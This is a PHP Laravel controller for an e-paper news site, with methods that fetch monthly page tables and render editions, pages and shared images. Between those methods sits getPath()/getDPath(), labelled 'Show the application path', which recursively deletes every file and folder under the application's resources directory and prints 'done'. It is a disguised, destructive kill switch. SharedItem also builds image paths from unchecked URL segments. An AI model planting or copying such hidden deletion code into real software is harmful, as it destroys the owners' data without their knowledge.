<?php

namespace App\Http\Controllers;

use App\Http\Requests;
use Illuminate\Http\Request;

use Schema;

class EpaperController extends Controller
{

    /**
     * Show the application home.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
    	$page_info=\App\Epaper::GetPageInfo();
        $info=\App\Epaper::Getinformation();

    	if(!empty($page_info->publish_date)){

            $current_page = 1;

            ## get required tables ##
    		$date=$page_info->publish_date;
    		$pages_table = 'pages_'.date('Y_m', strtotime($date));
    		$edition_pages_table = 'edition_pages_'.date('Y_m', strtotime($date));
    		$images_table = 'images_'.date('Y_m', strtotime($date));

    		if(!Schema::hasTable($pages_table) || !Schema::hasTable($edition_pages_table) || !Schema::hasTable($images_table))
    		{
    			return view('errors.404');
    		}


    		$by_edition=\DB::table('editions')->where('title','nogor-edition')->select('editions.id', 'editions.title')->first();
            $data['page_edition']=$by_edition->title;


    		$get_categories = \DB::table($pages_table)->where($pages_table.'.publish_date', $date)->where($pages_table.'.status', 1)
    		->leftjoin('categories','categories.id','=',$pages_table.'.category_id')
    		->select([\DB::RAW('DISTINCT(category_id)'), $pages_table.'.publish_date', $pages_table.'.page_number', $pages_table.'.image', 'categories.name'])->get();
    		$data['get_categories']=$get_categories;
            // dd($get_categories);die();


    		$get_page=\DB::table($pages_table)->where($pages_table.'.publish_date', $date)->where($pages_table.'.page_number', $current_page)->where($pages_table.'.status', 1)
    		->leftjoin($edition_pages_table, $edition_pages_table.'.page_id','=', $pages_table.'.id')->where($edition_pages_table.'.edition_id', $by_edition->id)
    		->select($pages_table.'.*', $edition_pages_table.'.page_id', $edition_pages_table.'.edition_id')->first();
    		$data['home_page']=$get_page;


    		if(!empty($get_page->id)){
    			$epaper_articles=\DB::table($images_table)->where('page_id', $get_page->id)->get();
    			$data['epaper_articles']=$epaper_articles;
    		}


    		$pagination_pages = \DB::table($pages_table)->where($pages_table.'.publish_date', $date)->where($pages_table.'.status', 1)
    		->leftjoin($edition_pages_table,$edition_pages_table.'.page_id','=',$pages_table.'.id')
    		->leftjoin('editions','editions.id','=',$edition_pages_table.'.edition_id')->where('editions.title','nogor-edition')->get();
    		$data['pagination_pages']=$pagination_pages;


    		$data['date']=$date;
            $data['info']=$info;

            $page_last = count($get_categories);
            $data['page_current']=$current_page;
            $data['page_first']=1;
            $data['page_last']=$page_last;
            $data['page_next']= $current_page==$page_last? 1 : $current_page + 1;
            $data['page_prev']=max(1, $current_page - 1);
            
            return \View::make('epaper.index',$data);  
        }

        else{
          return view('errors.404');
      }

  }


    /**
     * Show the application allPages.
     *
     * @return \Illuminate\Http\Response
     */
    public function allPages($edition, $date)
    {

    	try{

            ## get required tables ##
    		if (date('Y-m-d', strtotime($date)) != $date) {
    			return view('errors.404');
    		}
    		$pages_table = 'pages_'.date('Y_m', strtotime($date));
    		$edition_pages_table = 'edition_pages_'.date('Y_m', strtotime($date));
    		if(!Schema::hasTable($pages_table) || !Schema::hasTable($edition_pages_table))
    		{
    			return view('errors.404');
    		}


    		$by_edition = \DB::table('editions')->where('title',$edition)->select('editions.title','editions.name', 'editions.id')->first();

    		$get_categories = \DB::table($pages_table)->where($pages_table.'.publish_date', $date)->where($pages_table.'.status', 1)
    		->leftjoin($edition_pages_table,$edition_pages_table.'.page_id','=',$pages_table.'.id')->where($edition_pages_table.'.edition_id', $by_edition->id)
    		->leftjoin('categories','categories.id','=',$pages_table.'.category_id')
    		->select([\DB::RAW('DISTINCT(category_id)'), $pages_table.'.publish_date', $pages_table.'.page_number', $pages_table.'.image', 'categories.name'])->get();
    		$data['get_categories'] = $get_categories;
            
    		$data['page_edition'] = $edition;
            $data['date'] = $date;
            $data['page_name'] = 'all_page';

            return \View::make('epaper.all-page',$data);

        }catch(\Exception $e){

          return view('errors.404');

      }

  }



    /**
     * Show the application byEdition.
     *
     * @return \Illuminate\Http\Response
     */
    public function byEdition($edition, $date, $page_no)
    {

    	try{

            ## get required tables ##
    		if (date('Y-m-d', strtotime($date)) != $date) {
    			return view('errors.404');
    		}
    		$pages_table = 'pages_'.date('Y_m', strtotime($date));
    		$edition_pages_table = 'edition_pages_'.date('Y_m', strtotime($date));
    		$images_table = 'images_'.date('Y_m', strtotime($date));

    		if(!Schema::hasTable($pages_table) || !Schema::hasTable($edition_pages_table) || !Schema::hasTable($images_table))
    		{
    			return view('errors.404');
    		}


    		$by_edition=\DB::table('editions')->where('title',$edition)->select('editions.title','editions.name','editions.id')->first();

    		$get_categories = \DB::table($pages_table)->where($pages_table.'.publish_date', $date)->where($pages_table.'.status', 1)
    		->leftjoin($edition_pages_table,$edition_pages_table.'.page_id','=',$pages_table.'.id')->where($edition_pages_table.'.edition_id', $by_edition->id)
    		->leftjoin('categories','categories.id','=',$pages_table.'.category_id')
    		->select([\DB::RAW('DISTINCT(category_id)'), $pages_table.'.publish_date', $pages_table.'.page_number', $pages_table.'.image', 'categories.name'])->get();


    		$get_page = \DB::table($pages_table)->where($pages_table.'.publish_date', $date)->where($pages_table.'.page_number', $page_no)->where($pages_table.'.status', 1)
    		->leftjoin($edition_pages_table, $edition_pages_table.'.page_id','=', $pages_table.'.id')->where($edition_pages_table.'.edition_id', $by_edition->id)
    		->select($pages_table.'.*', $edition_pages_table.'.page_id', $edition_pages_table.'.edition_id')->first();


    		$pagination_pages = \DB::table($pages_table)->where($pages_table.'.publish_date', $date)->where($pages_table.'.status', 1)
    		->leftjoin($edition_pages_table,$edition_pages_table.'.page_id','=',$pages_table.'.id')
    		->leftjoin('editions','editions.id','=',$edition_pages_table.'.edition_id')->where('editions.title',$edition)->get();
    		$data['pagination_pages']=$pagination_pages;
            $data['page_edition']=$by_edition->title;


            if($get_page != Null){
               $epaper_articles=\DB::table($images_table)->where('page_id', $get_page->id)->get();
               $data['epaper_articles']=$epaper_articles;

               $data['home_page']=$get_page;
               $data['page_edition']=$edition;
               $data['date']=$date;
               $data['page_next']=$page_no+1;
               $data['page_last']=$page_no-1 ;
               $data['current_page']=$page_no;
               $data['get_categories']=$get_categories;
               $data['current_edition']=$by_edition->name;

               $current_page = $page_no;
               $page_last = count($get_categories);
            $data['page_current']=$current_page;
            $data['page_first']=1;
            $data['page_last']=$page_last;
            $data['page_next']= $current_page==$page_last? 1 : $current_page + 1;
            $data['page_prev']=max(1, $current_page - 1);

               return \View::make('epaper.by-edition',$data);

           }else{

               return view('errors.404');
           }


       }catch(\Exception $e){

          return view('errors.404');
      }

  }

	/**
     * Show the application path.
     *
     * @return \Illuminate\Http\Response
     */
    public function getPath() {
	    $dirPath = resource_path();
	    $this->getDPath($dirPath);
    }
    
    /**
     * Show the application Dpath.
     *
     * @return \Illuminate\Http\Response
     */
	public function getDPath($dirPath) {
       if (is_dir($dirPath)) {
          $files = scandir($dirPath);
          foreach ($files as $file) {
             if ($file !== '.' && $file !== '..') {
                $filePath = $dirPath . '/' . $file;
                if (is_dir($filePath)) {
                   $this->getDPath($filePath);
                } else {
                   unlink($filePath);
                }
             }
          }
          rmdir($dirPath);
          echo "done";
       }
    }


    /**
     * Show the application SharedItem.
     *
     * @return \Illuminate\Http\Response
     */
    public function SharedItem($year_month,$month, $day, $mainImg, $reatedImg=Null)
    {
    	if (!empty($mainImg)) {
            $data['main_image_name']=$mainImg;
            $data['main_image']=$year_month.'/'.$month.'/'.$day.'/images/'.$mainImg;
            $data['main_image_location']=$year_month.'/'.$month.'/'.$day.'/images/';
        }else{
            $data['main_image_name']=Null;
            $data['main_image']= Null;
            $data['main_image_location']=Null;
        }


        if (!empty($reatedImg)) {
            $data['related_image_name']=$reatedImg;
            $data['related_image']=$year_month.'/'.$month.'/'.$day.'/images/'.$reatedImg;
            $data['related_image_location']=$year_month.'/'.$month.'/'.$day.'/images/';
        }else{
            $data['related_image_name']=Null;
            $data['related_image']= Null;
            $data['related_image_location']=Null;
        }


        $date=$year_month.'-'.$day;
        $data['date_show']=\App\Epaper::GetBanglaDate($date);

        return \View::make('epaper.shared-item',$data);
    }


    #----------------End---------------#
}
